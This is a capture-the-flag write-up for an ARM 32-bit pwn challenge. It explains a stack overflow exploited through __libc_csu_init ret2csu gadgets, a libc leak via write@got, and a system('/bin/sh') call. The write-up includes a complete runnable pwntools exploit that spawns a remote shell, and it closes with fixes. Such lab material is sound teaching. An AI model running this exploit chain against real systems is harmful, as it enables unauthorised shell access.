Antidote is a Medium Pwn challenge that swaps the usual x86 for a 32-bit **ARM** binary. It hands you a single, over-sized `read()` into a stack buffer on a No-PIE, no-canary, NX target — but there is no `system` and no `/bin/sh` in the binary, so the whole game is: leak libc, then return into it. ARM has no convenient `pop {r0, r1, r2, pc}` gadget, so the interesting part is synthesising an arbitrary function call out of `__libc_csu_init`.

## Overview

- **Category:** Pwn · **Arch:** ARM 32-bit (EABI5) · **Difficulty:** Medium
- **Vuln class:** [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) ([CWE-121](https://cwe.mitre.org/data/definitions/121.html))
- **Path:** one-shot `read()` overflow → ret2csu leak of `write@got` → loop `main` → `system("/bin/sh")`

## The technique

`main` is essentially:

```c
char buf[0xC0];                      // buffer at fp-0xdc
memcpy(buf, "Bzzzzzzz...", 0x98);    // welcome banner
write(1, buf, 0x98);                 // print banner  (resolves write@got)
read(0, buf, 0x12c);                 // 300 bytes into a ~192-byte buffer
```

`read` accepts `0x12c = 300` bytes into a buffer whose saved return address (popped by
`main`'s closing `pop {fp, pc}`) sits only **220 bytes** away. No canary means we control
`pc` directly. `checksec`:

```
RELRO: None   Canary: None   NX: enabled   PIE: None (0x8000)
```

NX rules out shellcode; No-PIE freezes every gadget/GOT address. The binary imports
`read`, `write`, `memcpy`, `setvbuf` — no `system` — so we need a libc leak first.

ARM passes arguments in `r0-r3` and this binary has no `pop {r0,r1,r2,pc}` gadget. The
fix is the `__libc_csu_init` "call an arbitrary function with three controlled args"
sequence, present in every non-PIE ARM ELF:

```
0x85a0:  ldr r3, [r4], #4     ; r3 = *r4   (function pointer to call)
0x85a4:  mov r0, sl           ; r0 = r10
0x85a8:  mov r1, r8           ; r1 = r8
0x85ac:  mov r2, r7           ; r2 = r7
0x85b0:  sub r5, sb, #1
0x85b4:  blx r3               ; call it
0x85b8:  cmp r6, sb           ; if r6 == sb ...
0x85bc:  and r5, r5, r6
0x85c0:  popeq {r4,r5,r6,r7,r8,sb,sl,pc}   ; ... pop 8 regs + pc  -> we regain control
```

Registers are loaded by the sibling gadget `0x8628: pop {r4, r5, r6, r7, r8, sb, sl, pc}`.
The load-bearing trick is setting **`r6 == sb`**: the trailing `popeq` only fires when the
`cmp` sets the Z flag, and when it fires it pops a fresh `pc` off our stack — a clean
return after the call, so the chain can go *leak → back to main → exploit*.

## Solution

**Stage 1 — leak libc via `write@got`.** `main` calls `write` *before* the vulnerable
`read`, so by overflow time `write@got` (`0x10850`) already holds the resolved libc
address of `write`. Call `write(1, &write@got, 4)` and read the 4 leaked bytes, then
return to `main` to get a second shot:

```
libc_base = leaked_write - libc.symbols['write']   # write offset 0x8cbc5
```

**Stage 2 — `system("/bin/sh")`.** Back in `main`, overflow again. `system` is in no GOT
slot, so load it straight into `r3` with a `pop {r3, pc}` gadget and jump to the
mov-args-then-`blx r3` gadget:

```
0x8628  pop {r4..sl,pc}   ; sl(r0) = &"/bin/sh", pc = 0x863c
0x863c  pop {r3, pc}      ; r3 = system, pc = 0x85f4
0x85f4  mov r0,sl; mov r1,r8; mov r2,r7; blx r3   ; system("/bin/sh")
```

`system`/`write` live at odd libc offsets (they are Thumb functions); the GOT value and
pwntools' symbol addresses already carry that low bit, and `blx` switches ARM/Thumb mode
automatically, so no manual `| 1` is needed.

The full, runnable exploit:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'
exe  = ELF('antidote', checksec=False)
libc = ELF('libc.so.6', checksec=False)
HOST, PORT = sys.argv[1], int(sys.argv[2])

MAIN        = 0x84e4
POP_CSU     = 0x8628   # pop {r4, r5, r6, r7, r8, sb, sl, pc}
CALL_GADGET = 0x85a0   # ldr r3,[r4],#4; mov r0,sl; mov r1,r8; mov r2,r7; blx r3; ...; popeq
MOV_CALL    = 0x85f4   # mov r0,sl; mov r1,r8; mov r2,r7; blx r3
POP_R3      = 0x863c   # pop {r3, pc}
GOT_WRITE   = exe.got['write']   # 0x10850, resolved by the time our overflow fires
PAD = 220
WELCOME_END = b'That hurt!\n'

OFF_WRITE  = libc.symbols['write']
OFF_SYSTEM = libc.symbols['system']
OFF_BINSH  = next(libc.search(b'/bin/sh'))

io = remote(HOST, PORT)

leak = flat(
    b'A' * PAD, p32(POP_CSU),
    p32(GOT_WRITE), p32(0), p32(0), p32(4),
    p32(GOT_WRITE), p32(0), p32(1), p32(CALL_GADGET),
    p32(0)*7, p32(MAIN),
)
io.recvuntil(WELCOME_END)
io.send(leak)
libc.address = u32(io.recv(4)) - OFF_WRITE
system = libc.address + OFF_SYSTEM
binsh  = libc.address + OFF_BINSH
log.success(f'libc base : {libc.address:#010x}')

pwn = flat(
    b'A' * PAD, p32(POP_CSU),
    p32(0), p32(0), p32(0), p32(0), p32(0), p32(0), p32(binsh),
    p32(POP_R3), p32(system), p32(MOV_CALL),
)
io.recvuntil(WELCOME_END)
io.send(pwn)
io.sendline(b'cat flag*')
io.interactive()
```

## Why it worked

- **No canary** → a single `read()` overflow reaches the saved `pc` at a fixed offset.
- **No-PIE** → every gadget and GOT slot is a constant, so the whole ROP chain is static.
- **Lazy GOT + an early `write()` call** → the GOT already holds a real libc pointer to
  leak, defeating ASLR in one shot.
- **`__libc_csu_init` ARM gadgets** → give an arbitrary 3-arg call, and balancing
  `r6 == sb` turns that call into a chainable ROP link that returns to our stack.

## Fix / defense

- Bound the read to the buffer: `read(0, buf, sizeof(buf))`, never a fixed oversize length.
- Compile with `-fstack-protector-strong` — the canary trips before the `pop {fp, pc}`
  epilogue fires.
- Build `-pie` with full RELRO. Full RELRO also eager-resolves and read-only-maps the GOT,
  removing the very pointer this leak relies on. Any one of these breaks the exact chain.
